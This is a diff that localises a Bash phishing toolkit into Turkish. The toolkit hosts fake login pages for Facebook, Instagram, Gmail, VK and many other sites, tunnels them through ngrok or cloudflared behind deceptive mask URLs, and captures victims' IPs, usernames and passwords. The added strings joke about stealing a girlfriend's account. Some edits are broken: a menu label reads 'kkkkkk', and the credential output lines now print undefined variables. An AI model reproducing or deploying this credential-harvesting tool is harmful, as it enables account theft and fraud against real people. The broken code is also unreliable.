@@ -118,12 +118,12 @@ fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program sonlarıldı" 2>&1; reset_color; }
     exit 0
 }
 
 exit_on_signal_SIGTERM() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program kapandı." 2>&1; reset_color; }
     exit 0
 }
 
@@ -180,14 +180,14 @@ banner_small() {
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Gerekli paketler yükleniyor..."
 
     if [[ -d "/data/data/com.termux/files/home" ]]; then
         if [[ `command -v proot` ]]; then
             printf ''
         else
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
-            pkg install proot resolv-conf -y
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} paket yükleme : ${ORANGE}proot${CYAN}"${WHITE}
+            pkg install proot resolv-conf -y 
         fi
 
         if [[ `command -v tput` ]]; then
@@ -200,12 +200,12 @@ dependencies() {
     fi
 
 	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Paketler zaten kurulu."
 	else
 		pkgs=(php curl wget unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Paket yükleme : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ `command -v pkg` ]]; then
 					pkg install "$pkg" -y
 				elif [[ `command -v apt` ]]; then
@@ -217,7 +217,7 @@ dependencies() {
 				elif [[ `command -v dnf` ]]; then
 					sudo dnf -y install "$pkg"
 				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Desteklenmeyen paket yöneticisi, Paketleri manuel olarak kurun."
 					{ reset_color; exit 1; }
 				fi
 			}
@@ -240,7 +240,7 @@ download_ngrok() {
 		rm -rf "$file" > /dev/null 2>&1
 		chmod +x .server/ngrok > /dev/null 2>&1
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Hata oluştu, Ngrok'u manuel olarak kurun."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -257,7 +257,7 @@ download_cloudflared() {
 		mv -f "$file" .server/cloudflared > /dev/null 2>&1
 		chmod +x .server/cloudflared > /dev/null 2>&1
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Hata oluştu, Cloudflared'i manuel olarak yükleyin."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -265,9 +265,9 @@ download_cloudflared() {
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok zaten kurulu."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} ngrok yükleniyor..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
@@ -285,9 +285,9 @@ install_ngrok() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared zaten yüklü."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Cloudflared yükleniyor..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
@@ -305,7 +305,7 @@ install_cloudflared() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Bu aracı kullandığınız için teşekkür ederiz. İyi günler.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -318,27 +318,26 @@ about() {
 		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
 		${GREEN}Version  ${RED}:  ${ORANGE}2.2
 
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1,AliMilani ${RESETBG}
+		${REDBG}${WHITE} teşekkürler: Dr.mehmetaktass  ${RESETBG}
 
-		${RED}Warning:${WHITE}
-		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
-		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
+		${RED}DİKKAT:${WHITE}
+		${CYAN}Bu Araç yalnızca eğitim amaçlı yapılmıştır. Eğer sevgilinizin hesabını çalarsaniz beni karıştırmayın ${RED}!${WHITE}
+		${CYAN}Yazar, bu araç setinin herhangi bir şekilde kötüye kullanılmasından sorumlu olmayacaktır bilginize😋 ${RED}!${WHITE}
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${RED}[${WHITE}00${RED}]${ORANGE} Ana menü     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		99)
 			msg_exit;;
 		0 | 00)
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Ana menüye dönüş..."
 			{ sleep 1; main_menu; };;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; about; };;
 	esac
 }
@@ -348,10 +347,10 @@ HOST='127.0.0.1'
 PORT='8080'
 
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} sunucu kuruluyor..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} PHP sunucusunu başlatma..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
 
@@ -359,8 +358,8 @@ setup_site() {
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} kurbanın IP'si : ${BLUE}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Şuraya kaydedildi: : ${ORANGE}ip.txt"
 	cat .server/www/ip.txt >> ip.txt
 }
 
@@ -369,25 +368,25 @@ capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$HESAP"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PAROLA"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}kullanıcı adları.dat"
 	cat .server/www/usernames.txt >> usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Sonraki Giriş Bilgisi Bekleniyor, ${BLUE}Ctrl + C ${ORANGE}çıkışa doğru. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Giriş Bilgisi Bekleniyor, ${BLUE}Ctrl + C ${ORANGE} çıkış..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Kurban IP'si Bulundu!"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Giriş bilgisi Bulundu !!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -397,9 +396,9 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} başlatılıyor ... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Ngrok'u Başlatma..."
 
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
@@ -421,9 +420,9 @@ start_ngrok() {
 ## Start Cloudflared
 start_cloudflared() { 
         rm .cld.log > /dev/null 2>&1 &
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} başlatılıyor... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Cloudflared'ı Başlatma..."
 
     if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
@@ -442,10 +441,10 @@ start_cloudflared() {
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Başlatılıyor... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Başarıyla Barındırılan : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
@@ -455,12 +454,12 @@ tunnel_menu() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE}  Ngrok.io    ${RED}[${CYAN}Buggy${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir bağlantı noktası yönlendirme hizmeti seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -470,7 +469,7 @@ tunnel_menu() {
 		3 | 03)
 			start_cloudflared;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
@@ -479,14 +478,14 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Geleneksel Giriş Sayfası
+		${RED}[${WHITE}02${RED}]${ORANGE} Gelişmiş Oylama Anketi Giriş Sayfası
+		${RED}[${WHITE}03${RED}]${ORANGE} Sahte Güvenlik Giriş Sayfası
+		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Giriş Sayfası
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -506,7 +505,7 @@ site_facebook() {
 			mask='http://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -515,14 +514,14 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Geleneksel Giriş Sayfası
+		${RED}[${WHITE}02${RED}]${ORANGE} Otomatik Takipçi Giriş Sayfası
+		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Takipçi Giriş Sayfası
+		${RED}[${WHITE}04${RED}]${ORANGE} Mavi Rozet Doğrulama Giriş Sayfası
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -551,13 +550,13 @@ site_instagram() {
 site_gmail() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+		${RED}[${WHITE}01${RED}]${ORANGE} kkkkkk
+		${RED}[${WHITE}02${RED}]${ORANGE} Gmail Yeni Giriş Sayfası
+		${RED}[${WHITE}03${RED}]${ORANGE} Gelişmiş Oylama Anketi
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -582,12 +581,12 @@ site_gmail() {
 site_vk() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Geleneksel Giriş Sayfası
+		${RED}[${WHITE}02${RED}]${ORANGE} Gelişmiş Oylama Anketi Giriş Sayfası
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -599,7 +598,7 @@ site_vk() {
 			mask='http://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
@@ -608,7 +607,7 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Kurbanınız İçin Bir Saldırı Seçin daha sonra beni takip et (@dr.mehmetaktass) ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
@@ -623,11 +622,11 @@ main_menu() {
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		${RED}[${WHITE}34${RED}]${ORANGE} Discord
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${ORANGE} Hakkında         ${RED}[${WHITE}00${RED}]${ORANGE} çıkış
 
 	EOF
 	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -763,7 +762,7 @@ main_menu() {
 		0 | 00 )
 			msg_exit;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; main_menu; };;
 	
 	esac
